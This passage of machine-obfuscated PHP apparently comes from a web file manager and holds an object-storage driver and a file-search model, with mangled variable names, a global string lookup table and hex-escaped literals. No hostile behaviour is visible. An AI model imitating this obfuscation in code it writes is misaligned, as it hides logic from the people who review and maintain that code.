($Ñ´¨È³Í === null) { break; } } if ($ˆ½ƒ”Ú·) { $£ê€·Ş = array_diff($£ê€·Ş, array($ò›Ëß°)); $£ê€·Ş = count(array_unique($£ê€·Ş)); $ÁÊöÏ¹ù = count(array_unique($ÁÊöÏ¹ù)); return array($‡›ìäßí[217] => $£ê€·Ş, $‡›ìäßí[218] => $ÁÊöÏ¹ù); } return !1; } public function listAll($£×æ™•…) { $ö®Èôî =& $_SERVER[¹òÍ›æş]; $§´àË³¡ = $this->fileList($£×æ™•…, $ö®Èôî[12], !0); $˜ıßôš˜ = array_to_keyvalue($§´àË³¡[$ö®Èôî[93]], $ö®Èôî[32]); foreach ($§´àË³¡[$ö®Èôî[92]] as $Ô…œ¼æŞ) { if (is_string($Ô…œ¼æŞ)) { $˜ıßôš˜[$Ô…œ¼æŞ] = array($ö®Èôî[86] => 0); } } return $this->listAllFiles($£×æ™•…, $˜ıßôš˜); } public function canRead($Ä·¸š¡¸) { $ßÀ­£Û =& $_SERVER[¹òÍ›æş]; $“Ò–×øë = $this->client->getAccessControlPolicy($this->bucket, $Ä·¸š¡¸); if (!$“Ò–×øë) { return !1; } return in_array($“Ò–×øë, array($ßÀ­£Û[219], $ßÀ­£Û[220], $ßÀ­£Û[221])) ? !0 : !1; } public function canWrite($³ƒäôÇî) { $ŒåŠ»ÖĞ =& $_SERVER[¹òÍ›æş]; $ºŸùúá = $this->client->getAccessControlPolicy($this->bucket, $³ƒäôÇî); if (!$ºŸùúá) { return !1; } return in_array($ºŸùúá, array($ŒåŠ»ÖĞ[219], $ŒåŠ»ÖĞ[220])) ? !0 : !1; } public function getContent($¡ ì»Œó) { return $this->client->getObject($this->bucket, $¡ ì»Œó); } public function setContent($œ¦‰á¥, $ŸÌ±Ó‡× = '', $¨µúåú€ = false) { $¸¬¶é‡ =& $_SERVER[¹òÍ›æş]; $œ¦‰á¥ = $¨µúåú€ ? trim($œ¦‰á¥, $¸¬¶é‡[8]) . $¸¬¶é‡[8] : $œ¦‰á¥; $Óƒ±Ÿ’§ = get_file_mime(get_path_ext($œ¦‰á¥)); $Ğ×«±ğç = $this->client->putObject($ŸÌ±Ó‡×, $this->bucket, $œ¦‰á¥, $¸¬¶é‡[209], array(), $Óƒ±Ÿ’§); if (!$Ğ×«±ğç) { return !1; } if ($¨µúåú€) { return !0; } $this->cacheMethod(null, null); $Ğ×«±ğç = $this->copyFile($œ¦‰á¥, $œ¦‰á¥, array($¸¬¶é‡[222] => $Ğ×«±ğç[$¸¬¶é‡[223]])); return $Ğ×«±ğç ? !0 : !1; } public function fileSubstr($İûÜâ”±, $ÍşÚÄ, $„´øï™‘) { $“¤«àï = $ÍşÚÄ + $„´øï™‘ - 1; return $this->client->getObject($this->bucket, $İûÜâ”±, array($_SERVER[¹òÍ›æş][224] => "\142\x79\164\145\x73\75{$ÍşÚÄ}\55{$“¤«àï}")); } public function upload($¤ñİ÷¦“, $±ù…ó•€, $®—¤‘µ˜ = false, $èƒñ•œœ = REPEAT_REPLACE) { $ÃÉ’áıñ =& $_SERVER[¹òÍ›æş]; $–†ã¸¸À = array($ÃÉ’áıñ[222] => @md5_file($±ù…ó•€)); $ªÒé¢Š = array($ÃÉ’áıñ[225] => get_file_mime(get_path_ext($¤ñİ÷¦“))); if (IO::size($±ù…ó•€) <= 1024 * 1024 * 200) { $Ã¯óã = $this->client->putObjectFile($±ù…ó•€, $this->bucket, $¤ñİ÷¦“, $ÃÉ’áıñ[209], $–†ã¸¸À, $ªÒé¢Š); return !empty($Ã¯óã) ? $this->getPathOuter($¤ñİ÷¦“) : !1; } $ãø•Ï« = $this->client->multiUploadObject($±ù…ó•€, $this->bucket, trim($¤ñİ÷¦“, $ÃÉ’áıñ[8]), $–†ã¸¸À, $ªÒé¢Š); return $ãø•Ï« ? $this->getPathOuter($¤ñİ÷¦“) : !1; } public function download($ÖÙ·µ¨™, $êÕşõµ“) { if (!@is_dir($this->pathFather($êÕşõµ“)) && !IO::mkdir($this->pathFather($êÕşõµ“))) { return !1; } $ò‚öœå§ = $this->client->getObject($this->bucket, $ÖÙ·µ¨™, array(), $êÕşõµ“); return $ò‚öœå§ !== !1 ? $êÕşõµ“ : !1; } public function link($à…˜½¼£, $Á€‰°ıè = array()) { $Ö««˜… =& $_SERVER[¹òÍ›æş]; if ($this->signVer == $Ö««˜…[226]) { return $this->client->getAuthenticatedURL($this->bucket, $à…˜½¼£, 3600 * 12, $Á€‰°ıè); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($à…˜½¼£, $Ö««˜…[8]), 3600 * 12, $this->region, array(), !0, $Á€‰°ıè); } public function fileOut($½ù¼ÓÖ, $—¾ µ’  = false, $ïÆ¶Şáí = false, $éÄûÍ€ª = '') { $´¥ÓÌşñ =& $_SERVER[¹òÍ›æş]; if ($this->isFileOutServer()) { return $this->fileOutServer($½ù¼ÓÖ, $—¾ µ’ , $ïÆ¶Şáí, $éÄûÍ€ª); } if (!$ïÆ¶Şáí) { $ïÆ¶Şáí = $this->pathThis($½ù¼ÓÖ); } $›»ï¦¶î = get_file_mime(get_path_ext($ïÆ¶Şáí)); if ($›»ï¦¶î == $´¥ÓÌşñ[227]) { return parent::fileOut($½ù¼ÓÖ, $—¾ µ’ , $ïÆ¶Şáí, $éÄûÍ€ª); } $«üšóÚ¨ = array($´¥ÓÌşñ[228] => $›»ï¦¶î); if ($—¾ µ’ ) { $«üšóÚ¨[$´¥ÓÌşñ[229]] = $´¥ÓÌşñ[230] . rawurlencode($ïÆ¶Şáí); } else { } $ëéùèâ· = $this->link($½ù¼ÓÖ, $«üšóÚ¨); $this->fileOutLink($ëéùèâ·); } public function fileOutServer($¬Î°¤Û, $‹ˆóı¯ù = false, $¥úò·ñä = false, $ÖËÅæ = '') { parent::fileOut($¬Î°¤Û, $‹ˆóı¯ù, $¥úò·ñä, $ÖËÅæ); } public function fileOutImageServer($½ÀÏó¿, $ø•âÃú™ = 250) { parent::fileOutImage($½ÀÏó¿, $ø•âÃú™); } public function hashMd5($¨ô¹¢ÙÁ, $€ã€˜´ú = '') { $±”š®¨– =& $_SERVER[¹òÍ›æş]; $Æé÷µéî = $this->objectMeta($¨ô¹¢ÙÁ); if (!$Æé÷µéî) { return !1; } $€ã€˜´ú = $€ã€˜´ú ? $€ã€˜´ú : _get($Æé÷µéî, $±”š®¨–[231]); $€ã€˜´ú = $€ã€˜´ú ? $€ã€˜´ú : _get($Æé÷µéî, $±”š®¨–[223], $±”š®¨–[12]); return $€ã€˜´ú; } public function uploadFormData($ÈĞçˆŞ™, $±×â¾³˜ = 3600) { $¯»ÙÒÁÖ =& $_SERVER[¹òÍ›æş]; $²üŒâ¨ = $this->pathFather($ÈĞçˆŞ™); $©Œ¸şàÓ = $this->client->getHttpUploadPostParams($this->bucket, $²üŒâ¨, $¯»ÙÒÁÖ[209], $±×â¾³˜); return array_merge((array) $©Œ¸şàÓ, array($¯»ÙÒÁÖ[192] => $this->getHost())); } public function multiUploadFormData($É®…Îì¾, $§°¼±Ğ¸ = 3600) { $û×úÌü =& $_SERVER[¹òÍ›æş]; $ï¯÷£üß = gmdate($û×úÌü[232]); $ï§ĞÛÓâ = array(); $È¬ï÷ä‹ = $this->client->getUploadId($this->bucket, $É®…Îì¾, $ï§ĞÛÓâ); if (!$È¬ï÷ä‹) { return !1; } return array($û×úÌü[233] => $È¬ï÷ä‹, $û×úÌü[192] => $this->getHost() . $û×úÌü[8] . $this->pathEncode($É®…Îì¾), $û×úÌü[234] => $ï¯÷£üß, $û×úÌü[104] => $É®…Îì¾); } public function multiUploadAuthData($Ï ¡ùÙ, $†óôú›× = array()) { $“Êôø½ =& $_SERVER[¹òÍ›æş]; $°—Ü‘ßĞ = isset($†óôú›×[$“Êôø½[234]]) ? $†óôú›×[$“Êôø½[234]] : gmdate($“Êôø½[232]); $›âÎ¸ê³ = isset($†óôú›×[$“Êôø½[184]]) ? $†óôú›×[$“Êôø½[184]] : $“Êôø½[12]; $¦¯¥¥°Æ = $†óôú›×[$“Êôø½[104]]; unset($†óôú›×[$“Êôø½[104]]); if (isset($†óôú›×[$“Êôø½[235]])) { $†óôú›×[$“Êôø½[234]] = $°—Ü‘ßĞ; return $this->listUploadParts($¦¯¥¥°Æ, $†óôú›×); } $œ•ŸÊ’ğ = array($“Êôø½[236], $“Êôø½[12], $“Êôø½[130], $“Êôø½[12], "\x78\x2d\x61\155\172\x2d\144\x61\164\x65\72{$°—Ü‘ßĞ}", $“Êôø½[8] . $this->bucket . $“Êôø½[8] . $this->pathEncode($¦¯¥¥°Æ) . $›âÎ¸ê³); if (strpos($›âÎ¸ê³, $“Êôø½[237]) === 0) { $œ•ŸÊ’ğ[0] = $“Êôø½[238]; } if (isset($†óôú›×[$“Êôø½[239]]) && $†óôú›×[$“Êôø½[239]] == $“Êôø½[240]) { $œ•ŸÊ’ğ[0] = $“Êôø½[240]; } $¼È³» = implode($“Êôø½[59], $œ•ŸÊ’ğ); $´» ÙĞ‡ = base64_encode(hash_hmac($“Êôø½[241], $¼È³», $this->secret, !0)); $èï­Í§£ = $“Êôø½[242] . $this->accessKey . $“Êôø½[4] . $´» ÙĞ‡; if (strpos($›âÎ¸ê³, $“Êôø½[237]) === 0) { return array($“Êôø½[243] => $èï­Í§£, $“Êôø½[234] => $°—Ü‘ßĞ); } return $èï­Í§£; } public function listUploadParts($Ù„Şóˆ, $ùÙõ¤ = array()) { $à£ø‡Ëõ =& $_SERVER[¹òÍ›æş]; $Ôô¶È¾Å = str_replace($à£ø‡Ëõ[244], $à£ø‡Ëõ[12], $ùÙõ¤[$à£ø‡Ëõ[184]]); $»¶¿°ğƒ = $this->client->listParts($this->bucket, $Ù„Şóˆ, $Ôô¶È¾Å); if (!$»¶¿°ğƒ) { return !1; } unset($ùÙõ¤[$à£ø‡Ëõ[235]], $ùÙõ¤[$à£ø‡Ëõ[239]]); $ùÙõ¤[$à£ø‡Ëõ[104]] = $Ù„Şóˆ; $”Â§™ÊÙ = $this->multiUploadAuthData($Ù„Şóˆ, $ùÙõ¤); if (empty($”Â§™ÊÙ)) { return !1; } return array($à£ø‡Ëõ[243] => $”Â§™ÊÙ, $à£ø‡Ëõ[234] => $ùÙõ¤[$à£ø‡Ëõ[234]], $à£ø‡Ëõ[245] => $»¶¿°ğƒ); } public function getHost() { return parent::getHost() . $_SERVER[¹òÍ›æş][8] . $this->bucket; } public function size($÷‘¯³‚‰) { $ˆ”ì›ğÂ = $this->objectMeta($÷‘¯³‚‰); return $ˆ”ì›ğÂ ? $ˆ”ì›ğÂ[$_SERVER[¹òÍ›æş][86]] : 0; } public function info($’•°Ş£¸) { if ($this->isFolder($’•°Ş£¸)) { return $this->folderInfo($’•°Ş£¸); } else { if ($this->isFile($’•°Ş£¸)) { return $this->fileInfo($’•°Ş£¸); } } return !1; } public function exist($Â‡ĞÆæ×) { return $this->isFile($Â‡ĞÆæ×) || $this->isFolder($Â‡ĞÆæ×); } public function isFile($ëÍ”°€Ä) { return !$this->isFolder($ëÍ”°€Ä) && $this->objectMeta($ëÍ”°€Ä); } public function isFolder($ÓËå™ì) { return $this->cacheMethod($_SERVER[¹òÍ›æş][175], $ÓËå™ì); } protected function objectMeta($èğ£ÕçŠ) { return $this->cacheMethod($_SERVER[¹òÍ›æş][177], $èğ£ÕçŠ); } protected function _objectMeta($³œğ²³¹) { $âèµÆå =& $_SERVER[¹òÍ›æş]; $³œğ²³¹ = rtrim($³œğ²³¹, $âèµÆå[8]); try { $ÌÍğ¬è = $this->client->getObjectInfo($this->bucket, $³œğ²³¹); if (!isset($ÌÍğ¬è[$âèµÆå[231]]) && isset($ÌÍğ¬è[$âèµÆå[246]])) { $ÌÍğ¬è[$âèµÆå[231]] = $ÌÍğ¬è[$âèµÆå[246]]; } } catch (Exception $Öœ¤®€) { $ÌÍğ¬è = !1; } if (!$ÌÍğ¬è) { } return $ÌÍğ¬è; } protected function _isFolder($ÓÃ‡¬‹Ö) { $ÂğÀïå× =& $_SERVER[¹òÍ›æş]; $ÓÃ‡¬‹Ö = rtrim($ÓÃ‡¬‹Ö, $ÂğÀïå×[8]); if ($ÓÃ‡¬‹Ö == $ÂğÀïå×[12] || $ÓÃ‡¬‹Ö == $ÂğÀïå×[8]) { return !0; } $ ¸Æûç¡ = $this->client->getBucket($this->bucket, $ÓÃ‡¬‹Ö, null, 1); if (empty($ ¸Æûç¡[$ÂğÀïå×[214]])) { return !1; } $ø×™›‡Ù = $ ¸Æûç¡[$ÂğÀïå×[214]][0][$ÂğÀïå×[32]]; return stripos($ø×™›‡Ù, $ÓÃ‡¬‹Ö . $ÂğÀïå×[8]) === 0 ? !0 : !1; if (substr($ø×™›‡Ù, -1) == $ÂğÀïå×[8]) { return !0; } if (get_path_this($ø×™›‡Ù) == get_path_this($ÓÃ‡¬‹Ö)) { return !1; } return !0; } } goto C‡Â¹Õ›¹Š; eÔçí‰®Ï: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($òğ›¹ˆ˜) { $¨„øèí· =& $_SERVER[¹òÍ›æş]; $¬Á ·¶¤ = KodIO::fileTypeList(); $œ³¶¹ÓÜ = $¬Á ·¶¤[$òğ›¹ˆ˜]; if (!$œ³¶¹ÓÜ) { return array(); } $ŒÖÍá´ï = $œ³¶¹ÓÜ[$¨„øèí·[184]]; $ß­°àÓ¯ = $¨„øèí·[7]; if (!$œ³¶¹ÓÜ[$¨„øèí·[184]]) { $¸ËŸÀâÕ = array_to_keyvalue($¬Á ·¶¤, $¨„øèí·[12], $¨„øèí·[184]); $ŒÖÍá´ï = implode($¨„øèí·[50], $¸ËŸÀâÕ); $ß­°àÓ¯ = $¨„øèí·[2115]; } $•ËŠ¯³² = explode($¨„øèí·[50], trim($ŒÖÍá´ï, $¨„øèí·[50])); return array($ß­°àÓ¯, $•ËŠ¯³²); } public function listPathType($ª®§ÛŒÌ) { $‚™£½±Ò =& $_SERVER[¹òÍ›æş]; $§’–†ìæ = $this->fileTypeWhere($ª®§ÛŒÌ); if (!$§’–†ìæ) { return array(); } $š‡•‚ãø = USER_ID; $Ôíà¡Ÿá = Model($‚™£½±Ò[563])->getInfo($š‡•‚ãø); $ß¸ó“©¡ = array($‚™£½±Ò[614] => SourceModel::TYPE_USER, $‚™£½±Ò[549] => array($‚™£½±Ò[578], $‚™£½±Ò[559] . $Ôíà¡Ÿá[$‚™£½±Ò[97]][$‚™£½±Ò[440]] . $‚™£½±Ò[579]), $‚™£½±Ò[615] => $š‡•‚ãø, $‚™£½±Ò[612] => 0, $‚™£½±Ò[613] => $§’–†ìæ); return $this->listSource($ß¸ó“©¡); } public function listSearch($Ì É± , $¢âå°×¥ = 300) { $¡Ò—¬Ñø =& $_SERVER[¹òÍ›æş]; if (isset($Ì É± [$¡Ò—¬Ñø[1953]]) && $Ì É± [$¡Ò—¬Ñø[1953]]) { $Ì É± [$¡Ò—¬Ñø[1953]] = str_replace($¡Ò—¬Ñø[422], $¡Ò—¬Ñø[2116], trim($Ì É± [$¡Ò—¬Ñø[1953]])); } $“ºã¼‰— = $this->_parseSearchWhere($Ì É± ); if (!isset($“ºã¼‰—[$¡Ò—¬Ñø[469]])) { $“ºã¼‰—[$¡Ò—¬Ñø[469]] = 0; } $µª­Âñİ = $¡Ò—¬Ñø[2117]; $­™ß÷Ÿ¢ = $“ºã¼‰—; $ûûğ©ñ = $µª­Âñİ; $this->_listSearchBindPinyin($Ì É± , $“ºã¼‰—, $µª­Âñİ); $this->alias($¡Ò—¬Ñø[484])->_makeOrder(); $“ºã¼‰— = $this->parseWhereLike($“ºã¼‰—); $ìúıãçÍ = $this->distinct(!0)->field($µª­Âñİ)->where($“ºã¼‰—)->selectPage($¢âå°×¥); if ($GLOBALS[$¡Ò—¬Ñø[6]][$¡Ò—¬Ñø[419]][$¡Ò—¬Ñø[420]] && Input::check($Ì É± [$¡Ò—¬Ñø[1953]], $¡Ò—¬Ñø[621]) && $ìúıãçÍ[$¡Ò—¬Ñø[404]][$¡Ò—¬Ñø[391]] == 1 && $ìúıãçÍ[$¡Ò—¬Ñø[404]][$¡Ò—¬Ñø[405]] == 0) { $ìúıãçÍ = $this->distinct(!0)->field($µª­Âñİ)->where($­™ß÷Ÿ¢)->limit(1000)->select(); $ìúıãçÍ = array_page_split($ìúıãçÍ, !1, $¢âå°×¥); } $this->_listSearchFileContent($ìúıãçÍ, $Ì É± , $ûûğ©ñ, $­™ß÷Ÿ¢); $this->_listSearchDesc($ìúıãçÍ, $Ì É± , $ûûğ©ñ); $this->_listSearchTag($ìúıãçÍ, $Ì É± , $ûûğ©ñ); $this->_listSearchGroupTag($ìúıãçÍ, $Ì É± , $ûûğ©ñ); $this->_listDataApply($ìúıãçÍ[$¡Ò—¬Ñø[407]]); $this->_listMake($ìúıãçÍ); return $ìúıãçÍ; } private function _listSearchFileContent(&$£óüèæ, $®Ç½®Š§, $úÛğ´¨Ä, $ÛÔ•ïôÚ) { $æèî¥şğ =& $_SERVER[¹òÍ›æş]; if (!$®Ç½®Š§[$æèî¥şğ[1953]] || $£óüèæ[$æèî¥şğ[404]][$æèî¥şğ[391]] > 1) { return; } if (!isset($ÛÔ•ïôÚ[$æèî¥şğ[32]]) || !is_array($®Ç½®Š§[$æèî¥şğ[506]])) { return; } $ÛÔ•ïôÚ[$æèî¥şğ[506]] = array($æèî¥şğ[7], $®Ç½®Š§[$æèî¥şğ[506]]); unset($ÛÔ•ïôÚ[$æèî¥şğ[32]]); unset($®Ç½®Š§[$æèî¥şğ[506]]); $€ó•Şêè = $this->field($úÛğ´¨Ä)->where($ÛÔ•ïôÚ)->limit($æèî¥şğ[2118])->select(); if (!$€ó•Şêè || count($€ó•Şêè) == 0) { return; } $£óüèæ[$æèî¥şğ[407]] = array_merge($€ó•Şêè, $£óüèæ[$æèî¥şğ[407]]); $£óüèæ[$æèî¥şğ[404]][$æèî¥şğ[405]] += count($€ó•Şêè); } private function _listSearchTag(&$¶ŸëË , $Í€ºì¸©, $ÙìÕÓ†È) { $«¬ö¨ø =& $_SERVER[¹òÍ›æş]; if (!$Í€ºì¸©[$«¬ö¨ø[1953]] || $¶ŸëË [$«¬ö¨ø[404]][$«¬ö¨ø[391]] > 1) { return; } $Ï¬¿Â²† = Model($«¬ö¨ø[2119])->listData(); $Á…­‚æ™ = array(); $åå“ÇÔ© = $Í€ºì¸©[$«¬ö¨ø[1953]]; foreach ($Ï¬¿Â²† as $³¾ğÉËÅ) { $—ÀâÃ‹û = $³¾ğÉËÅ[$«¬ö¨ø[32]]; $ËØ¢š„‹ = str_replace($«¬ö¨ø[53], $«¬ö¨ø[12], Pinyin::get($—ÀâÃ‹û)); if (stripos($—ÀâÃ‹û, $åå“ÇÔ©) !== !1 || stripos($ËØ¢š„‹, $åå“ÇÔ©) !== !1) { $Á…­‚æ™[] = $³¾ğÉËÅ[$«¬ö¨ø[437]]; } } if (!$Á…­‚æ™) { return; } $€‡Ü‘¸¶ = array($«¬ö¨ø[464] => array($«¬ö¨ø[7], $Á…­‚æ™), $«¬ö¨ø[1669] => USER_ID); $×†ÃªÜÎ = Model($«¬ö¨ø[466])->field($«¬ö¨ø[94])->where($€‡Ü‘¸¶)->select(); $×†ÃªÜÎ = array_to_keyvalue($×†ÃªÜÎ, $«¬ö¨ø[12], $«¬ö¨ø[94]); $¯¨ºè¡İ = array_unique($×†ÃªÜÎ); $this->_listSearchMerge($¶ŸëË , $Í€ºì¸©, $ÙìÕÓ†È, $¯¨ºè¡İ); } private function _listSearchDesc(&$¯¦ß«Ë˜, $“„¦¦ª³, $ü¾ŒÄ¾Å) { $û§¢µÆŠ =& $_SERVER[¹òÍ›æş]; if (!$“„¦¦ª³[$û§¢µÆŠ[1953]] || $¯¦ß«Ë˜[$û§¢µÆŠ[404]][$û§¢µÆŠ[391]] > 1) { return; } $¤³İÁ‚É = array($û§¢µÆŠ[104] => $û§¢µÆŠ[491], $û§¢µÆŠ[412] => array($û§¢µÆŠ[421], $û§¢µÆŠ[1955] . $“„¦¦ª³[$û§¢µÆŠ[1953]] . $û§¢µÆŠ[1955])); $—ê¯ğÛ¶ = !1; if ($—ê¯ğÛ¶) { $œµ–Š–‘ = $this->listSearchChildren($“„¦¦ª³[$û§¢µÆŠ[470]]); $œµ–Š–‘ = array_unique($œµ–Š–‘); if (!$œµ–Š–‘) { return; } $¤³İÁ‚É[$û§¢µÆŠ[440]] = array($û§¢µÆŠ[7], $œµ–Š–‘); } $è‚Šºàõ = Model($û§¢µÆŠ[598])->field($û§¢µÆŠ[440])->where($¤³İÁ‚É)->limit(5000)->select(); $ƒÎï²‘‚ = array_to_keyvalue($è‚Šºàõ, $û§¢µÆŠ[12], $û§¢µÆŠ[440]); $this->_listSearchMerge($¯¦ß«Ë˜, $“„¦¦ª³, $ü¾ŒÄ¾Å, $ƒÎï²‘‚); } private function _listSearchGroupTag(&$’è”ª¬, $‡¤Ì·, $šµËš†) { $ò¼êõ¢ğ =& $_SERVER[¹òÍ›æş]; if (!$‡¤Ì·[$ò¼êõ¢ğ[1953]] || $’è”ª¬[$ò¼êõ¢ğ[404]][$ò¼êõ¢ğ[391]] > 1 || !$‡¤Ì·[$ò¼êõ¢ğ[470]]) { return; } $ƒÃí³Â = $this->sourceInfo($‡¤Ì·[$ò¼êõ¢ğ[470]]); if (!$ƒÃí³Â || $ƒÃí³Â[$ò¼êõ¢ğ[449]] != SourceModel::TYPE_GROUP) { return; } $ñÄŠé¦Õ = $ƒÃí³Â[$ò¼êõ¢ğ[534]]; $×¾¨Õ¸ = Model($ò¼êõ¢ğ[2120])->get($ñÄŠé¦Õ); $—İÜÜ´ü = array(); $¥º å›ª = $‡¤Ì·[$ò¼êõ¢ğ[1953]]; foreach ($×¾¨Õ¸[$ò¼êõ¢ğ[407]] as $×ñŞ¹ù´) { $¥†®¶äõ = $×ñŞ¹ù´[$ò¼êõ¢ğ[32]]; $ÁòÈ°‡‰ = str_replace($ò¼êõ¢ğ[53], $ò¼êõ¢ğ[12], Pinyin::get($¥†®¶äõ)); if (stripos($¥†®¶äõ, $¥º å›ª) !== !1 || stripos($ÁòÈ°‡‰, $¥º å›ª) !== !1) { $—İÜÜ´ü[] = $×ñŞ¹ù´[$ò¼êõ¢ğ[437]]; } } if (!$—İÜÜ´ü) { return; } $ÙŞË½Ÿ = array($ò¼êõ¢ğ[464] => array($ò¼êõ¢ğ[7], $—İÜÜ´ü), $ò¼êõ¢ğ[1669] => 0, $ò¼êõ¢ğ[33] => $ò¼êõ¢ğ[1975] . $ñÄŠé¦Õ); $ÉÚš™äÊ = Model($ò¼êõ¢ğ[466])->field($ò¼êõ¢ğ[94])->where($ÙŞË½Ÿ)->select(); $ÉÚš™äÊ = array_to_keyvalue($ÉÚš™äÊ, $ò¼êõ¢ğ[12], $ò¼êõ¢ğ[94]); $ÅÒ×ŠÜŠ = array_unique($ÉÚš™äÊ); $this->_listSearchMerge($’è”ª¬, $‡¤Ì·, $šµËš†, $ÅÒ×ŠÜŠ); } private function _listSearchMerge(&$¬Ã„Ã¹â, $†£ßË¢, $ÁÜ­œ“, $«©Ñ×Ş) { $—‚•ùû =& $_SERVER[¹òÍ›æş]; if (!$«©Ñ×Ş) { return; } $À—³Ôôù = array_to_keyvalue($¬Ã„Ã¹â[$—‚•ùû[407]], $—‚•ùû[12], $—‚•ùû[440]); $À¼°Ò´ = array_diff($«©Ñ×Ş, $À—³Ôôù); if (!$À¼°Ò´) { return; } $¢Ğ”ÂËÒ = array($—‚•ùû[440] => array($—‚•ùû[7], $À¼°Ò´)); $óÈãÛ¤­ = $this->field($ÁÜ­œ“)->where($¢Ğ”ÂËÒ)->select(); if (!$óÈãÛ¤­) { return; } $ìÕÕ  = array(); foreach ($óÈãÛ¤­ as $ƒ ©şä™) { if ($this->_listSearchFilter($ƒ ©şä™, $†£ßË¢)) { $ìÕÕ [] = $ƒ ©şä™; } } $¬Ã„Ã¹â[$—‚•ùû[407]] = array_merge($ìÕÕ , $¬Ã„Ã¹â[$—‚•ùû[407]]); $¬Ã„Ã¹â[$—‚•ùû[404]][$—‚•ùû[405]] += count($ìÕÕ ); } private function _listSearchFilter($å€Ñª¸´, $É•Ì…ü) { $½°¤¿—í =& $_SERVER[¹òÍ›æş]; $¿œí±ØÛ = $å€Ñª¸´[$½°¤¿—í[448]] == $½°¤¿—í[98]; if (!strstr($å€Ñª¸´[$½°¤¿—í[549]], $½°¤¿—í[50] . $É•Ì…ü[$½°¤¿—í[470]] . $½°¤¿—í[50])) { return !1; } if (isset($É•Ì…ü[$½°¤¿—í[450]]) && $É•Ì…ü[$½°¤¿—í[450]] != $½°¤¿—í[1914]) { if ($É•Ì…ü[$½°¤¿—í[450]] == $½°¤¿—í[85] && !$¿œí±ØÛ) { return !1; } if ($É•Ì…ü[$½°¤¿—í[450]] != $½°¤¿—í[85] && $¿œí±ØÛ) { return !1; } if (!strstr($å€Ñª¸´[$½°¤¿—í[184]], $½°¤¿—í[50] . $É•Ì…ü[$½°¤¿—í[450]] . $½°¤¿—í[50])) { return !1; } } if (isset($É•Ì…ü[$½°¤¿—í[2121]]) && $É•Ì…ü[$½°¤¿—í[2121]] < $å€Ñª¸´[$½°¤¿—í[86]]) { return !1; } if (isset($É•Ì…ü[$½°¤¿—í[2122]]) && $É•Ì…ü[$½°¤¿—í[2122]] > $å€Ñª¸´[$½°¤¿—í[86]]) { return !1; } if (isset($É•Ì…ü[$½°¤¿—í[628]]) && $É•Ì…ü[$½°¤¿—í[628]] != $å€Ñª¸´[$½°¤¿—í[494]]) { return !1; } return !0; } public function listSearchChildren($ÇÕİûµ, $ÚÙ„™Ô = 5000) { $²‰‡°· =& $_SERVER[¹òÍ›æş]; $ü†•ÆúÕ = array(); $Ùæèôæ² = $this->sourceInfo($ÇÕİûµ); $ò¦ú¢ñ = array($²‰‡°·[549] => array($²‰‡°·[421], $Ùæèôæ²[$²‰‡°·[549]] . $Ùæèôæ²[$²‰‡°·[440]] . $²‰‡°·[579])); $ÆËòˆÊ÷ = $this->field($²‰‡°·[86])->where($ò¦ú¢ñ)->limit($ÚÙ„™Ô + 1)->select(); $ø°¤Â½Ò = is_array($ÆËòˆÊ÷) ? count($ÆËòˆÊ÷) : 0; if ($ø°¤Â½Ò > $ÚÙ„™Ô) { return $this->_listSearchChildrenNear($ÇÕİûµ, $ÚÙ„™Ô); } $Ñ‘Ÿêò© = $this->field($²‰‡°·[440])->where($ò¦ú¢ñ)->select(); $ü†•ÆúÕ = array_to_keyvalue($Ñ‘Ÿêò©, $²‰‡°·[12], $²‰‡°·[440]); return $ü†•ÆúÕ; } private function _listSearchChildrenNear($‹‘¦Ó´×, $õå¦«Ú) { $˜Ñ¼á¡¥ =& $_SERVER[¹òÍ›æş]; $« ö²ö = array(); $µò‡¸ = array($˜Ñ¼á¡¥[470] => $‹‘¦Ó´×); $Ñ’‰úš = $this->field($˜Ñ¼á¡¥[2123])->where($µò‡¸)->select(); $ü…¾¦Å = array_to_keyvalue(array_filter_by_field($Ñ’‰úš, $˜Ñ¼á¡¥[448], $˜Ñ¼á¡¥[98]), $˜Ñ¼á¡¥[12], $˜Ñ¼á¡¥[440]); $« ö²ö = array_merge($« ö²ö, array_to_keyvalue($Ñ’‰úš, $˜Ñ¼á¡¥[12], $˜Ñ¼á¡¥[440])); if (!$ü…¾¦Å) { return $« ö²ö; } $µò‡¸ = array($˜Ñ¼á¡¥[470] => array($˜Ñ¼á¡¥[7], $ü…¾¦Å)); $Ñ’‰úš = $this->field($˜Ñ¼á¡¥[2123])->where($µò‡¸)->limit($õå¦«Ú)->select(); $« ö²ö = array_merge($« ö²ö, array_to_keyvalue($Ñ’‰úš, $˜Ñ¼á¡¥[12], $˜Ñ¼á¡¥[440])); $« ö²ö = array_slice($« ö²ö, 0, $õå¦«Ú); return $« ö²ö; } private function _listSearchBindPinyin($ïªäÊÔ, &$²¯ä÷ˆª, &$½ÒğÜı) { $ä×ˆÄêù =& $_SERVER[¹òÍ›æş]; if (!isset($ïªäÊÔ[$ä×ˆÄêù[1953]]) || !$ïªäÊÔ[$ä×ˆÄêù[1953]]) { return; } if (!Input::check($ïªäÊÔ[$ä×ˆÄêù[1953]], $ä×ˆÄêù[356]) || strlen($ïªäÊÔ[$ä×ˆÄêù[1953]]) < 2) { return; } $¶†¦ôÑ» = "\x4c\x45\106\x54\x20\112\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\x72\x63\145\x5f\155\145\164\141\x20\x6d\145\164\x61\40\x6f\x6e\40\163\157\x75\162\x63\x65\56\163\x6f\x75\162\x63\x65\x49\104\x20\x3d\40\155\x65\x74\x61\56\x73\157\165\x72\x63\145\111\104"; $Õşå°«® = array(); $½ÒğÜı = str_replace(array($ä×ˆÄêù[59], $ä×ˆÄêù[53], $ä×ˆÄêù[2124]), $ä×ˆÄêù[12], $½ÒğÜı); $½ÒğÜı = $ä×ˆÄêù[476] . str_replace($ä×ˆÄêù[50], $ä×ˆÄêù[477], $½ÒğÜı); $Õ×£Ôö¢ = $²¯ä÷ˆª[$ä×ˆÄêù[32]]; unset($²¯ä÷ˆª[$ä×ˆÄêù[32]]); foreach ($²¯ä÷ˆª as $é‘ö‘ñË => $Šƒı´ï) { $Õşå°«®[$ä×ˆÄêù[476] . $é‘ö‘ñË] = $Šƒı´ï; } foreach ($Õ×£Ôö¢ as $Ú–„ÑºÜ) { $Õşå°«®[] = array($ä×ˆÄêù[481] => $Ú–„ÑºÜ, $ä×ˆÄêù[1027] => $ä×ˆÄêù[1957], array($ä×ˆÄêù[2125] => $Ú–„ÑºÜ, $ä×ˆÄêù[2126] => array($ä×ˆÄêù[7], 